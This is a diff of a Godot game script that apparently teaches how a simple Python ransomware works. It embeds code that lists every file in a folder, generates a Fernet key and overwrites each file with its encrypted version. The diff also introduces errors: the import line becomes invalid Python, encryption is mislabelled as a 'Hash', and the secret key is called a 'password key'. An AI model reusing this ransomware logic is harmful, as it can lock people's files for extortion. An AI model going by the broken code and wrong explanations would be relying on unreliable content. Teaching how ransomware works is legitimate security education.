@@ -12,7 +12,7 @@ extends MarginContainer
 
 var step: int = 0
 var ransomware_code = {
-	"step_1" : "import os\nfrom cryptography.fernet import Fernet",
+	"step_1" : "import os from cryptography.fernet\nimport fernet",
 	"step_2": "allfiles = []\nfor file in os.listdir():\n\tif file == 'malware.py' or file == 'key.key' or file == 'decr.py':\n\t\tcontinue\n\tif os.path.isfile(file):\n\t\tallfiles.append(file)\nprint(allfiles)\n\n",
 	"step_3": "key = Fernet.generate_key()\nwith open('key.key', 'wb') as thekey:\n\tthekey.write(key)\n\n",
 	"step_4": "for file in allfiles:\n\twith open(file, 'rb') as thefile:\n\t\tcontent = thefile.read()\n\tcontent_encryp = Fernet(key).encrypt(content)\n\twith open(file, 'wb') as thefile:\n\t\tthefile.write(content_encryp)\n\n",
@@ -89,17 +89,17 @@ func set_step(step: int) -> void:
 			rich_text_label.text = "Step 4: Encrypting the Files\n\nHere’s where the real work happens:\n\n- The program loops through every file in the allfiles list.\n\n- Each file is opened in binary read mode (rb) so the raw data can be read."
 			animation.play("encrypt_ransomware_step4.2")
 		12:
-			rich_text_label.text = "Step 4: Encrypting the Files\n\nHere’s where the real work happens:\n\n- The program loops through every file in the allfiles list.\n\n- Each file is opened in binary read mode (rb) so the raw data can be read.\n\n- That data is then fed into Fernet(key).encrypt(), which scrambles the content into a completely unreadable format."
+			rich_text_label.text = "Step 4: Encrypting the Files\n\nHere’s where the real work happens:\n\n- The program loops through every file in the allfiles list.\n\n- Each file is opened in binary read mode (rb) so the raw data can be read.\n\n- That data is then fed into Fernet(key).encrypt(), which scrambles the content into a completely unreadable format (Hash)."
 			animation.play("encrypt_ransomware_step4.3")
 		13:	
-			rich_text_label.text = "Step 4: Encrypting the Files\n\n- Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).\n\nAt this point, the files are no longer usable in their normal form — they have been locked with the secret key."
+			rich_text_label.text = "Step 4: Encrypting the Files\n\n- Finally, the encrypted version replaces the original file by writing it back in binary write mode (wb).\n\nAt this point, the files are no longer usable in their normal form — they have been locked with the password key."
 			animation.play("encrypt_ransomware_step4.4")
 		14:
 			code_edit.text = ransomware_code.step_1 + "\n\n" + ransomware_code.step_2  + ransomware_code.step_3 + ransomware_code.step_4 + ransomware_code.step_5
 			rich_text_label.text = "Step 5: Final Confirmation\n\nThe program prints a message to confirm that all the files have been encrypted.”"
 			animation.play("encrypt_ransomware_step5")
 		15: 
-			rich_text_label.text = "Now we will run the code and generate a key. Exit the window when done"
+			rich_text_label.text = "Now we will run the code and generate a key."
 		16:
 			window.visible=true
 			animation.play("RansomwareRun")
